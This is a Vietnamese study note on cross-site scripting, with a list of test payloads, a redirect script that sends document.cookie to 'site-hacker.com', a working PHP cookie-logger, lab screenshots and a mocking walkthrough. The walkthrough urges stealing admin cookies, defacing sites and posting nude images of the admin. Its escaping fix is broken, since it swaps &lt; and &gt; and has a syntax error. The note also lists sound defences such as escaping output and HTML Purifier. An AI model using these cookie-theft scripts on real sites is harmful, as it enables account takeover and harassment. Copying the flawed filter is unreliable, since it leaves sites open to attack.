# A3-Cross-Site Scripting (XSS)

- **[khái quát về xss](#1)**
- **[ các đoạn js truyền vào để check lỗi](#2)**
- **[ cách khắc phục](#5)**
- **[ thực hành trên lab](#3)**
- **[ Cách tấn công và hạ gục 1 trang web bằng xss](#4)**

<a name="1"></a>
## khái quát
XSS được viết tắt bởi Cross-Site-Scripting. Nó là một phương pháp tấn công cơ bản. Nó dựa trên việc thực thi HTML và JavaScript trên một trang web. Việc tấn công này có thể xảy ra khi xác nhận những lệnh ở các text-box, hoặc cũng có thể là trên thanh URL. Những kết quả được đọc dưới dạng HTML, vì vậy nó sử dụng một vài thủ thuật Social-Engineering để tác động đến 1 ai đó tải một virus mà chính bạn đã tạo ra, và là tiềm năng cho một botnet, hoặc RAT, cũng có thể là 1 keylogger. XSS có thể trở nên rất nguy hiểm, Nhưng cũng có thể rất vô hại.
### gồm 3 loại
- STORED-XSS :  chèn đoạn js thông qua lưu trữ , vd gửi tn đến admin

-  REFLECTED-XSS: Khác với Stored-XSS, Reflected-XSS đoạn mã khai thác sẽ không được lưu trữ trên server , chèn js vào mục tìm kiến hay cmt...

- xss dom based : chưa nắm rõ
<a name="2"></a>

## các đoạn mã check lỗi:tham khảo tại [đây](https://www.youtube.com/watch?v=Iu3QtMy9cpg&index=2&list=PL1A2CSdiySGIRec2pvDMkYNi3iRO89Zot#t=1.464711)
```

"><script>alert("XSS")</script>
"><script>alert(String.fromCharCode(88,83,83)) </script>
'><script>alert("XSS")</script>
'><script>alert(String.fromCharCode(88,83,83))</script>
<ScRIPt>aLeRT("XSS")</ScRIPt>
<ScRIPt<aLeRT(String.fromCharCode(88,83,83))</ScRIPt>
"><ScRIPt>aLeRT("XSS")</ScRIPt>
"><ScRIPt<aLeRT(String.fromCharCode(88,83,83)) </ScRIPt>
'><ScRIPt>aLeRT("XSS")</ScRIPt>
'><ScRIPt<aLeRT(String.fromCharCode(88,83,83))</ScRIPt>
</script><script>alert("XSS")</script>
</script><script>alert(String.fromCharCode(88,83,83) )</script>
"/><script>alert("XSS")</script>
"/><script>alert(String.fromCharCode(88,83,83))</script>
'/><script>alert("XSS")</script>
'/><script>alert(String.fromCharCode(88,83,83))</script>
</SCRIPT>"><SCRIPT>alert("XSS")</SCRIPT>
</SCRIPT>"><SCRIPT>alert(String.fromCharCode(88,83,8 3))
</SCRIPT>">"><SCRIPT>alert("XSS")</SCRIPT>
</SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83 ,83))</SCRIPT>
";alert("XSS");"
";alert(String.fromCharCode(88,83,83));"
';alert("XSS");'
';alert(String.fromCharCode(88,83,83));'
";alert("XSS")
";alert(String.fromCharCode(88,83,83))
';alert("XSS")
';alert(String.fromCharCode(88,83,83))

câu lệnh chuyển tiếp
<script>window.location.href = "http://www.trang-mới.com"</script>

```
 - đoạn PHP get cookie
 `<script>window.location=”http://site-hacker.com/get_cookie.php?phpcc=”+document.cookie+”&url=http://myblog.com”;</script>  
`
 
 ```
 <?php
/*
* Created on 16. april. 2007 Được tạo ngày 16/8/2007
* Created by Audun Larsen (audun@munio.no)- Tác giả-
*
* Copyright 2006 Munio IT, Audun Larsen
*
* THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
* INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS
* FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
* FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
* (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
* OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
* OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
* EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

if(strlen($_SERVER['QUERY_STRING']) > 0) {
$fp=fopen('./CookieLog.txt', 'a');
fwrite($fp, urldecode($_SERVER['QUERY_STRING'])."\n");
fclose($fp);
} else {
?>

var ownUrl = 'http://<?php echo $_SERVER['HTTP_HOST']; ?><?php echo $_SERVER['PHP_SELF']; ?>';

// ==
// URLEncode and URLDecode functions
//
// Copyright Albion Research Ltd. 2002
// http://www.albionresearch.com/
//
// You may copy these functions providing that
// (a) you leave this copyright notice intact, and
// (b) if you use these functions on a publicly accessible
// web site you include a credit somewhere on the web site
// with a link back to http://www.albionresearch.com/
//
// If you find or fix any bugs, please let us know at albionresearch.com
//
// SpecialThanks to Neelesh Thakur for being the first to
// report a bug in URLDecode() - now fixed 2003-02-19.
// And thanks to everyone else who has provided comments and suggestions.
// ==
function URLEncode(str)
{
// The Javascript escape and unescape functions do not correspond
// with what browsers actually do...
var SAFECHARS = "0123456789" + // Numeric
"ABCDEFGHIJKLMNOPQRSTUVWXYZ" + // Alphabetic
"abcdefghijklmnopqrstuvwxyz" +
"-_.!~*'()"; // RFC2396 Mark characters
var HEX = "0123456789ABCDEF";

var plaintext = str;
var encoded = "";
for (var i = 0; i < plaintext.length; i++ ) {
var ch = plaintext.charAt(i);
if (ch == " ") {
encoded += "+"; // x-www-urlencoded, rather than %20
} else if (SAFECHARS.indexOf(ch) != -1) {
encoded += ch;
} else {
var charCode = ch.charCodeAt(0);
if (charCode > 255) {
alert( "Unicode Character '"
+ ch
+ "' cannot be encoded using standard URL encoding.\n" +
"(URL encoding only supports 8-bit characters.)\n" +
"A space (+) will be substituted." );
encoded += "+";
} else {
encoded += "%";
encoded += HEX.charAt((charCode >> 4) & 0xF);
encoded += HEX.charAt(charCode & 0xF);
}
}
} // for

return encoded;
};

cookie = URLEncode(document.cookie);
html = '<img src="'+ownUrl+'?'+cookie+'">';
document.write(html);

< ?php
}
?>
``` 
<a name="5"></a>
## cách khắc phục xss

### . Cách khắc phục :

Để phòng chống tốt nhất XSS là theo nguyên tắc FIEO (Filter Input, Escape Output). Để làm việc này thì hiện tại có khá nhiều bộ lọc để chúng ta lựa chọn. Hôm nay mình giới thiệu tới các bạn một bộ thư viện viết bằng PHP cho phép filter HTML để ngăn chặn kẻ xấu post mã độc XSS thông qua website của bạn,
Cách 1 :Viết mã lọc nội dung theo nguyên tắc FIEO (Filter Input, Escape Output) . Vì các đoạn mã độc bắt đầu vối “<script>” và kết thúc với “</script>” . Thay : “<” và “>” = “&gt;” và “&lt;” (các thực thể html) .Ta có đoạn code sau :
PHP Code:
```
str_replace("<","&gt;",$info);str_replace(">","&lt;",$info);str_replace("'","&apos;",$info);str_replace(""","&quot;",$info);
str_replace("&","&amp;",$info);  
```
Cách 2 : Dùng thư viện có sẵn , đó là HTML Purifier. Website: http://htmlpurifier.org/
HTMLPurifier.png

Nói sơ qua về HTML Purifier thì đây là bộ thư viện rất mạnh dùng triển khai trong code của mình để chống XSS. Được xây dựng theo mô hình OOP nên sử dụng rất dễ, sau thao tác include file thư viện, chỉ cần tạo instance của đối tượng HTML Purifier và gọi phương thức purify() là có thể filter được dữ liệu đầu vào. 
PHP Code:
```
<?phprequire_once '/path/to/htmlpurifier/library/HTMLPurifier.auto.php';$purifier = new HTMLPurifier();$clean_html = $purifier->purify($dirty_html);
<a name="3"></a>
```
## lab 

**XSS - Reflected (GET),XSS - Reflected (POST)**
<img src="http://image.prntscr.com/image/c5611150478940c799cc3e47046a8965.png">

**XSS - Reflected (JSON)** chú ý , câu lệnh mở đầu để đóng cho phù hợp, ;`prompt("hiện khung nhập")`
<img src="http://image.prntscr.com/image/01053693841144838dff6e57136cd5be.png">

**XSS - Stored (User-Agent)**

<img src="http://image.prntscr.com/image/d26603cff35b44dda6efe9c057ce7b68.png">


<a name="4"></a>

## cách tấn công và hạ gục 1 trang web bằng xss!( thực ra chỉ check lỗi thôi :trollface: )

**B1** check lỗi: thưởng thì mình hay nhập `<xss>` để kiểm tra :

<img src="http://image.prntscr.com/image/16a6b9342eab4ea6a14ae64ea17578b7.png">

trong trường hợp này từ khóa tìm kiếm được đưa vào tất cả , không bị lọc hay mã hóa gì cả ! mình khẳng định 99,69% bị dính xss! 

**B2** nhập 1 đoạn script huyền cmn thoại! `<script>alert("xss")</script`

<img src="http://image.prntscr.com/image/8940ce62ade34bc28dfc70c71588a9fa.png">

  trời địu ! sao nó méo nhảy ra bảng thông báo xss, đờ mờ , té thôi ! đấy nếu là người khác thì người ta sẽ nghĩ thế , còn mình thì không . mình liền kiểm tra source của nó ,

  <img src="http://image.prntscr.com/image/a73a3645d3c942be80138b9eb713054c.png">

  Rõ ràng là đoạn js đã được truyền vào một cách hoàn chỉnh , vậy có gì uẩn khúc ở đây? à trước đoạn js có 1 thẻ title á đìu , vậy chỉ cần đóng thẻ đó lại và truyền js vào thôi!

  **B3** tuyệt chiêu kết thúc nó!
  <img src="http://image.prntscr.com/image/050d3eb04a9b4ceb91bf0c45298cd763.png">

  headshot! :v 

  kiểm tra thử cookie nào 

  <img src="http://image.prntscr.com/image/047f93d1296443ef8e35d898bdbb33d5.png">

  **B4** bạn có thể làm gì khi thấy 1 site dính xss!( cái này theo ý nghĩ của mình)
 
  - chiếm quyền đăng nhập , bằng cách chèn vào 1 đoạn script lấy cookie của người dùng, sau đó đăng nhập dưới danh nghĩa người dùng và làm chuyện ấy :trollface: ( chuyển tiền , mua hàng ...)

  - hoặc đơn giản hơn , lấy cookie thằng admin , thằng này phải đem ra xử bắn đầu tiên khi site dính lỗi! sau khi lấy cookie và đăng nhập với tư cách admin , bạn có để deface web của nó , post clip 69, ảnh nude thằng ad( khuyến khích=)) ), 

  - và đơn giản hơn , chèn 1 đoạn chuyển hướng về web của bạn , tăng lượt view, =))

  ** đặc biệt , tất cả cách trên đều phải gửi đoạn js cho người dùng hoặc thằng ad, cách tấn công này gọi là `REFLECTED-XSS` **
